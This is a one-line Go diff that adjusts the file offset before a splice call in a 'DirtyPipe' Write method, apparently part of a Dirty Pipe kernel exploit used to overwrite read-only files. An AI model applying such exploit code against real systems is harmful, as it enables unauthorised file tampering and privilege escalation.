@@ -39,6 +39,7 @@ func (p DirtyPipe) Write(filepath string, offset int64, content []byte) (err err
 		return
 	}
 	defer w.Close()
+	offset--
 	n, err := syscall.Splice(int(f.Fd()), &offset, int(w.Fd()), nil, 1, 0)
 	if err != nil {
 		err = fmt.Errorf("splice failed: %w", err)
